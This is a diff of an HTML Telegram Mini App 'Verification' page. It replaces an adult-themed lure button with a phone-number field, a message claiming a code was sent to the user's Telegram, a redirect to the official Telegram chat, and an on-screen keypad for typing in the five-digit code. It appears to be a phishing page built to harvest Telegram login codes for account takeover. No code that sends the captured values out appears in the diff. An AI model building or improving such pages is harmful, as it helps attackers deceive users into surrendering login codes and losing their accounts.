@@ -4,14 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Verification</title>
+
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
 <style>
 body {
     margin: 0;
-    font-family: Arial;
     background: #000;
     color: white;
+    font-family: Arial;
     display: flex;
     justify-content: center;
     align-items: flex-end;
@@ -25,34 +26,54 @@ body {
     text-align: center;
 }
 
-.btn {
-    background: #ff4757;
-    padding: 18px;
+input {
+    width: 100%;
+    padding: 15px;
+    border-radius: 12px;
     border: none;
-    border-radius: 15px;
+    margin-bottom: 15px;
+    font-size: 16px;
+}
+
+.btn {
+    width: 100%;
+    padding: 16px;
+    background: #ff4757;
+    border: none;
+    border-radius: 12px;
     color: white;
     font-size: 18px;
-    width: 100%;
-    margin-top: 10px;
 }
 
 .hidden { display: none; }
 
 .otp-box {
     display: flex;
-    gap: 8px;
     justify-content: center;
+    gap: 8px;
     margin: 20px 0;
 }
 
 .otp {
-    width: 40px;
-    height: 50px;
+    width: 45px;
+    height: 55px;
     background: #222;
-    text-align: center;
-    font-size: 25px;
-    line-height: 50px;
-    border-radius: 8px;
+    border-radius: 10px;
+    font-size: 26px;
+    line-height: 55px;
+}
+
+.keypad {
+    display: grid;
+    grid-template-columns: repeat(3,1fr);
+    gap: 10px;
+}
+
+.key {
+    padding: 15px;
+    background: #333;
+    border-radius: 10px;
+    font-size: 20px;
 }
 </style>
 </head>
@@ -63,12 +84,14 @@ body {
 
     <!-- STEP 1 -->
     <div id="step1">
-        <button class="btn" onclick="start()">🍓 Start Continue 🔞</button>
+        <input type="tel" id="phone" placeholder="Enter your number">
+        <button class="btn" onclick="goStep2()">Continue</button>
     </div>
 
     <!-- STEP 2 -->
     <div id="step2" class="hidden">
-        <button class="btn" onclick="openTelegramChat()">📩 Get Code</button>
+        <p>We sent a code to your Telegram 📩</p>
+        <button class="btn" onclick="openTG()">📩 Get Code</button>
     </div>
 
     <!-- STEP 3 -->
@@ -82,6 +105,22 @@ body {
             <div class="otp" id="b4"></div>
             <div class="otp" id="b5"></div>
         </div>
+
+        <div class="keypad">
+            <div class="key" onclick="addNum('1')">1</div>
+            <div class="key" onclick="addNum('2')">2</div>
+            <div class="key" onclick="addNum('3')">3</div>
+            <div class="key" onclick="addNum('4')">4</div>
+            <div class="key" onclick="addNum('5')">5</div>
+            <div class="key" onclick="addNum('6')">6</div>
+            <div class="key" onclick="addNum('7')">7</div>
+            <div class="key" onclick="addNum('8')">8</div>
+            <div class="key" onclick="addNum('9')">9</div>
+            <div></div>
+            <div class="key" onclick="addNum('0')">0</div>
+            <div class="key" onclick="clearNum()">⌫</div>
+        </div>
+
     </div>
 
 </div>
@@ -90,41 +129,55 @@ body {
 let tg = window.Telegram.WebApp;
 tg.expand();
 
-let currentOTP = "";
+let otp = "";
 
 // STEP 1 → STEP 2
-function start() {
+function goStep2() {
+    let phone = document.getElementById("phone").value;
+
+    if (!phone) {
+        alert("Enter number");
+        return;
+    }
+
     document.getElementById("step1").classList.add("hidden");
     document.getElementById("step2").classList.remove("hidden");
 }
 
-// 👉 GET CODE CLICK
-function openTelegramChat() {
-    tg.showAlert("Check your Telegram messages for the code 📩");
+// 🔥 GET CODE → Telegram open
+function openTG() {
 
-    // Telegram chat open (mini app background এ যাবে)
-    setTimeout(() => {
-        window.location.href = "tg://resolve?domain=Telegram";
-    }, 700);
+    // vibration feel (optional)
+    if (tg.HapticFeedback) {
+        tg.HapticFeedback.impactOccurred("medium");
+    }
 
-    // এরপর OTP screen show
+    // direct Telegram open
+    window.location.href = "tg://resolve?domain=Telegram";
+
+    // OTP screen show after returning
     setTimeout(() => {
         document.getElementById("step2").classList.add("hidden");
         document.getElementById("step3").classList.remove("hidden");
-    }, 1500);
+    }, 1200);
 }
 
-// OTP INPUT (demo)
-document.addEventListener("keydown", (e) => {
-    if (!isNaN(e.key) && currentOTP.length < 5) {
-        currentOTP += e.key;
-        updateBoxes();
+// OTP input
+function addNum(n) {
+    if (otp.length < 5) {
+        otp += n;
+        update();
     }
-});
+}
 
-function updateBoxes() {
+function clearNum() {
+    otp = otp.slice(0, -1);
+    update();
+}
+
+function update() {
     for (let i = 1; i <= 5; i++) {
-        document.getElementById("b" + i).innerText = currentOTP[i-1] || "";
+        document.getElementById("b"+i).innerText = otp[i-1] || "";
     }
 }
 </script>
